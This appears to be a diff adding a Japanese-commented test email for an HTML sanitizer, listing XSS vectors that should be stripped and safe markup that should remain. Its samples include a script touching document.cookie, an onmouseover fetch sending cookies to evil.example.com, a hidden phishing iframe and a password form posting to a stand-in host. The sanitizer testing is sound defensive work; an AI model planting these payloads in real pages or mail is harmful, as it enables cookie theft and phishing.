@@ -1,0 +1,97 @@
+From: attacker@external.test
+To: test@internal.test
+Subject: [sanitize test] XSS 無害化確認メール
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="==boundary_sanitize_test=="
+
+--==boundary_sanitize_test==
+Content-Type: text/plain; charset=UTF-8
+
+これはプレーンテキスト代替パートです。
+HTML を表示できない環境向けに添付しています。
+
+--==boundary_sanitize_test==
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <!-- ▼ style タグ（standard ポリシーでは除去される） -->
+  <style>
+    body { background: red; }
+  </style>
+</head>
+<body>
+
+<h2>sanitize-worker テスト用メール</h2>
+<p>このメールには以下の要素が含まれています。Mailpit で受信後にソースを確認してください。</p>
+
+<hr>
+
+<!-- ============================================================ -->
+<!-- ★ 除去されるべきもの（sanitize 後に残っていたら問題）        -->
+<!-- ============================================================ -->
+
+<h3>[除去対象1] script タグ</h3>
+<p>下の script タグは除去されるはずです。</p>
+<script>
+  alert('XSS: script タグ実行');
+  document.cookie = 'stolen=true';
+</script>
+
+<h3>[除去対象2] javascript: スキームのリンク</h3>
+<a href="javascript:alert('XSS: javascript href')">このリンクをクリック（除去対象）</a>
+
+<h3>[除去対象3] イベントハンドラー属性</h3>
+<p onclick="alert('XSS: onclick')"
+   onmouseover="fetch('https://evil.example.com/steal?c='+document.cookie)">
+  このテキストにはイベントハンドラーが付いています（除去対象）
+</p>
+
+<h3>[除去対象4] iframe</h3>
+<iframe src="https://evil.example.com/phishing" width="0" height="0" style="display:none"></iframe>
+<p>↑ iframe は除去されるはずです（非表示でも危険）</p>
+
+<h3>[除去対象5] object / embed</h3>
+<object data="https://evil.example.com/malware.swf" type="application/x-shockwave-flash"></object>
+<embed src="https://evil.example.com/malware.swf" type="application/x-shockwave-flash">
+<p>↑ object / embed は除去されるはずです</p>
+
+<h3>[除去対象6] data: URI によるリソース読み込み</h3>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANS" onerror="alert('XSS: img onerror')">
+<p>↑ data: URI と onerror は除去されるはずです</p>
+
+<h3>[除去対象7] form タグ（フィッシング入力欄）</h3>
+<form action="https://evil.example.com/collect" method="post">
+  パスワード: <input type="password" name="pw">
+  <input type="submit" value="送信（除去対象）">
+</form>
+
+<hr>
+
+<!-- ============================================================ -->
+<!-- ★ 残るべきもの（sanitize 後も表示されていればOK）            -->
+<!-- ============================================================ -->
+
+<h3>[保持対象] 安全な HTML タグ</h3>
+<p>この段落は <strong>太字</strong>、<em>斜体</em>、<u>下線</u> を含みます。</p>
+<ul>
+  <li>リスト項目 1</li>
+  <li>リスト項目 2</li>
+</ul>
+<blockquote>引用テキストです。</blockquote>
+
+<h3>[保持対象] 安全なリンク</h3>
+<a href="https://www.google.com" target="_blank">https://www.google.com</a>
+
+<h3>[保持対象] テーブル</h3>
+<table border="1">
+  <tr><th>ヘッダー1</th><th>ヘッダー2</th></tr>
+  <tr><td>セル1</td><td>セル2</td></tr>
+</table>
+
+</body>
+</html>
+
+--==boundary_sanitize_test==--
